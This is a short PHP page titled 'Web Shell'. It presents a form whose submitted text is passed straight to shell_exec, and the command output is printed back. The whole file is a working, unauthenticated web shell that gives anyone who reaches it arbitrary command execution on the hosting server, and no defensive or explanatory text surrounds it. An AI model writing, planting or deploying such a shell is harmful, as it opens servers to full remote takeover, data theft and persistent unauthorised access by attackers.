<!DOCTYPE html>
<html>
<head>
  <title>Web Shell</title>
</head>
<body>
  <h1>Web Shell</h1>
  
  <form action="" method="post">
    <input type="text" name="command" placeholder="Enter a command">
    <input type="submit" value="Run">
  </form>

  <?php
  if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $command = $_POST['command'];
    $output = shell_exec($command);
    echo "<pre>$output</pre>";
  }
  ?>
</body>
</html>
